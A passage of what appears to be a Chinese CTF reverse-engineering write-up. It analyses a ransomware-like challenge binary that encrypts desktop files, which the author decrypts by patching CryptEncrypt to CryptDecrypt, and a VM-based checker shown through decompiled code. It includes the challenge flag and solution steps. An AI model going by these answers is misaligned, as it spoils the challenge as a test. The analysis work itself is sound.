&amp;FindFileData) );<br>          FindClose(hFindFile);<br>        &#125;<br>      &#125;<br>    &#125;<br>    CoTaskMemFree(ppszPath);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>懒得看win api了，直接调试看内容</p><p><img src="assets/2024-01-25-15-07-44-image.png"></p><p>遍历桌面上<code>document</code>文件夹里的所有文件，过滤<code>.</code>开头的文件</p><p><code>sub_F717E0</code>是一些宽字符串转换</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_F717E0</span><span class="hljs-params">(LPCWCH lpWideCharStr, LPCWSTR lpFileName)</span><br>&#123;<br>  <span class="hljs-type">int</span> cbMultiByte; <span class="hljs-comment">// [esp+Ch] [ebp-10h]</span><br>  CHAR *lpMultiByteStr; <span class="hljs-comment">// [esp+10h] [ebp-Ch]</span><br><br>  cbMultiByte = WideCharToMultiByte(<span class="hljs-number">0xFDE9</span>u, <span class="hljs-number">0</span>, lpWideCharStr, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  lpMultiByteStr = (CHAR *)sub_F72156(cbMultiByte);<br>  WideCharToMultiByte(<span class="hljs-number">0xFDE9</span>u, <span class="hljs-number">0</span>, lpWideCharStr, <span class="hljs-number">-1</span>, lpMultiByteStr, cbMultiByte, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  sub_F71640(&amp;dword_F75414, &amp;dword_F75418, lpMultiByteStr, <span class="hljs-built_in">strlen</span>(lpMultiByteStr));<br>  <span class="hljs-keyword">return</span> sub_F713E0((<span class="hljs-type">int</span>)&amp;dword_F75414, (<span class="hljs-type">int</span>)&amp;dword_F75418, lpFileName);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>sub_F71640</code>是一些密码操作，没对文件进行操作，忽略掉</p><p><code>sub_F713E0</code>里面有文件操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !ReadFile(hObject, lpBuffer, nNumberOfBytesToRead, &amp;NumberOfBytesRead, <span class="hljs-number">0</span>) )<br>  <span class="hljs-keyword">break</span>;<br>FileSize -= NumberOfBytesRead;<br><span class="hljs-keyword">if</span> ( !CryptEncrypt(*a1, <span class="hljs-number">0</span>, FileSize == <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, lpBuffer, &amp;NumberOfBytesRead, dwBytes)<br>  || !WriteFile(hFile, lpBuffer, NumberOfBytesRead, &amp;NumberOfBytesRead, <span class="hljs-number">0</span>) )<br>&#123;<br>  <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> ( !FileSize )<br>&#123;<br>  v8 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>读文件，用密钥加密，再写回去</p><p>加解密密钥应该一样，直接把<code>CryptEncrypt</code>替换成<code>CryptDecrypt</code>（要nop掉一个参数）就能解密</p><p><code>flag&#123;7sa963fa-91a6-4371-bl7b-225102y789a0&#125;</code></p><h2 id="coos"><a href="#coos" class="headerlink" title="coos"></a>coos</h2><p>main函数输入，enc加密，末尾每8字节跟密文比较</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main_0</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  __CheckForDebuggerJustMyCode(&amp;unk_10E2016);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, dword_10E05D0[<span class="hljs-number">0</span>]);<br>  vm_init1();<br>  vm_init2();<br>  v11 = <span class="hljs-number">0</span>;<br>  j_memset(Str, <span class="hljs-number">0</span>, <span class="hljs-number">0x64</span>u);<br>  xor_66(::Str);<br>  <span class="hljs-built_in">printf</span>(::Str, v4);<br>  xor_66(::Str);<br>  xor_66(aC);<br>  <span class="hljs-built_in">scanf</span>(aC, Str);<br>  xor_66(aC);<br>  <span class="hljs-keyword">if</span> ( j_strlen(Str) != <span class="hljs-number">32</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  v11 = Str;<br>  v8 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(v9, <span class="hljs-number">0</span>, <span class="hljs-number">28</span>);<br>  check(Str, &amp;v8);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i )<br>  &#123;<br>    v6 = dword_10E0578[i];<br>    <span class="hljs-keyword">if</span> ( v9[<span class="hljs-number">2</span> * i - <span class="hljs-number">1</span>] != dword_10DE280[<span class="hljs-number">2</span> * v6] || v9[<span class="hljs-number">2</span> * i] != dword_10DE284[<span class="hljs-number">2</span> * v6] )<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  xor_66(&amp;byte_10DF5C4);<br>  <span class="hljs-built_in">printf</span>(&amp;byte_10DF5C4, v5);<br>  xor_66(&amp;byte_10DF5C4);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>密文的比较只有4次，手动运行dump一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ans = [<span class="hljs-number">0x9c149c0fce40e599</span>, <span class="hljs-number">0xdf4c680dcd759c04</span>, <span class="hljs-number">0xbbafb056e52e3dc0</span>, <span class="hljs-number">0x8e299c86b8f527cb</span>]<br></code></pre></td></tr></table></figure><p><code>enc</code>里面是虚拟机，先初始化虚拟机指令，将输入数据每8字节用虚拟机进行加密</p><p><code>vm_main</code>是个比较简单的虚拟机</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">vm_main</span><span class="hljs-params">(<span class="hljs-type">int</span> instruction, <span class="hljs-type">int</span> ins_len)</span><br>&#123;<br>  __CheckForDebuggerJustMyCode(&amp;unk_10E2016);<br>  pc = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    dword_10DFB70 = pc;<br>    result = pc;<br>    <span class="hljs-keyword">if</span> ( pc &gt;= ins_len )<br>      <span class="hljs-keyword">return</span> result;<br>    <span class="hljs-keyword">switch</span> ( *(instruction + <span class="hljs-number">4</span> * pc) )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        movq(&amp;reg0, reg1, SHIDWORD(reg1));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        movq(&amp;reg0, reg2, SHIDWORD(reg2));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        movq(&amp;reg0, reg3, SHIDWORD(reg3));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        movq(&amp;reg1, reg0, SHIDWORD(reg0));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        movq(&amp;reg1, reg2, SHIDWORD(reg2));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>        movq(&amp;reg1, reg3, SHIDWORD(reg3));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>        movq(&amp;reg2, reg0, SHIDWORD(reg0));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>        movq(&amp;reg2, reg1, SHIDWORD(reg1));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br>        movq(&amp;reg2, reg3, SHIDWORD(reg3));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0xA</span>:<br>        movq(&amp;reg3, reg0, SHIDWORD(reg0));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0xB</span>:<br>        movq(&amp;reg3, reg1, SHIDWORD(reg1));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0xC</span>:<br>        movq(&amp;reg3, reg2, SHIDWORD(reg2));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0xD</span>:                                 <span class="hljs-comment">// loadiq 加载4字节</span><br>        v3 = *(instruction + <span class="hljs-number">4</span> * pc + <span class="hljs-number">4</span>);<br>        movq(&amp;reg3, v3, SHIDWORD(v3));<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0xE</span>:                                 <span class="hljs-comment">// nop</span><br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0xF</span>:                                 <span class="hljs-comment">// nop</span><br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x10</span>:<br>        pushq(reg1, SHIDWORD(reg1));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x11</span>:<br>        shlq(&amp;reg0, *(instruction + <span class="hljs-number">4</span> * pc + <span class="hljs-number">4</span>));<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x12</span>:<br>        popq(&amp;reg2);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x13</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x14</span>:<br>        shrq(&amp;reg1, *(instruction + <span class="hljs-number">4</span> * pc + <span class="hljs-number">4</span>));<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x15</span>:<br>        popq(&amp;reg3);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x16</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x17</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x18</span>:<br>        addq(&amp;reg0, reg2, SHIDWORD(reg2));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x19</span>:<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x1C</span>:<br>        pushq(reg0, SHIDWORD(reg0));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x1A</span>:<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x1E</span>:<br>        shrq(&amp;reg0, *(instruction + <span class="hljs-number">4</span> * pc + <span class="hljs-number">4</span>));<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x1B</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x1D</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x1F</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x20</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x21</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x22</span>:<br>        nop();<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x23</span>:<br>        popq(&amp;reg1);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x24</span>:<br>        addq(&amp;reg1, reg0, SHIDWORD(reg0));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x25</span>:<br>        popq(&amp;reg0);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x26</span>:<br>        v4 = *(instruction + <span class="hljs-number">4</span> * pc + <span class="hljs-number">4</span>);<br>        xorq(&amp;reg0, v4, SHIDWORD(v4));<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x27</span>:<br>        pushq(reg2, SHIDWORD(reg2));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x28</span>:<br>        xorq(&amp;reg0, reg1, SHIDWORD(reg1));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x29</span>:<br>        v5 = *(instruction + <span class="hljs-number">4</span> * pc + <span class="hljs-number">4</span>);<br>        xorq(&amp;reg1, v5, SHIDWORD(v5));<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x2A</span>:<br>        addq(&amp;reg1, reg2, SHIDWORD(reg2));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x2B</span>:<br>        xorq(&amp;reg1, reg2, SHIDWORD(reg2));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x2C</span>:<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x2D</span>:<br>        addq(&amp;reg0, reg1, SHIDWORD(reg1));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x2F</span>:<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x30</span>:<br>        sub_10D1177(*(instruction + <span class="hljs-number">4</span> * pc + <span class="hljs-number">4</span>));<br>        sub_10D12C1(*(instruction + <span class="hljs-number">4</span> * pc + <span class="hljs-number">8</span>));<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x31</span>:<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x32</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x33</span>:<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x34</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x35</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x36</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x37</span>:<br>        v6 = *(instruction + <span class="hljs-number">4</span> * pc + <span class="hljs-number">4</span>);<br>        andq(&amp;reg0, v6, SHIDWORD(v6));<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x38</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x39</span>:<br>        v7 = *(instruction + <span class="hljs-number">4</span> * pc + <span class="hljs-number">4</span>);<br>        movq(&amp;reg2, v7, SHIDWORD(v7));<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x3A</span>:<br>        v8 = *(instruction + <span class="hljs-number">4</span> * pc + <span class="hljs-number">4</span>);<br>        movq(&amp;reg1, v8, SHIDWORD(v8));<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x3B</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x3C</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x3D</span>:<br>        shlq(&amp;reg2, reg0);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x3E</span>:<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x3F</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x40</span>:<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x41</span>:<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x42</span>:<br>        v9 = *(instruction + <span class="hljs-number">4</span> * pc + <span class="hljs-number">4</span>);<br>        movq(&amp;reg4, v9, SHIDWORD(v9));<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x43</span>:<br>        movq(&amp;reg1, q_input, SHIDWORD(q_input));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x44</span>:<br>        shrq(&amp;reg1, reg0);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x45</span>:<br>        movq(&amp;reg1, dword_10DE000[<span class="hljs-number">2</span> * reg0], dword_10DE000[<span class="hljs-number">2</span> * reg0 + <span class="hljs-number">1</span>]);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x46</span>:<br>        shlq(&amp;reg3, *(instruction + <span class="hljs-number">4</span> * pc + <span class="hljs-number">4</span>));<br>        pc += <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x47</span>:<br>        shlq(&amp;reg1, reg3);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x48</span>:<br>        addq(&amp;reg4, reg1, SHIDWORD(reg1));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x49</span>:<br>        addq(&amp;reg2, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x4A</span>:<br>        shrq(&amp;reg1, reg2);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x4B</span>:<br>        movq(&amp;reg1, dword_10DE080[<span class="hljs-number">2</span> * reg2], dword_10DE080[<span class="hljs-number">2</span> * reg2 + <span class="hljs-number">1</span>]);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x4C</span>:<br>        shlq(&amp;reg0, reg1);<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x4D</span>:<br>        addq(&amp;reg4, reg0, SHIDWORD(reg0));<br>        ++pc;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x4E</span>:<br>        reg0 = <span class="hljs-number">0</span>i64;<br>        reg1 = <span class="hljs-number">0</span>i64;<br>        reg3 = <span class="hljs-number">0</span>i64;<br>        reg4 = <span class="hljs-number">0</span>i64;<br>        v10 = *&amp;byte_10E03A8[<span 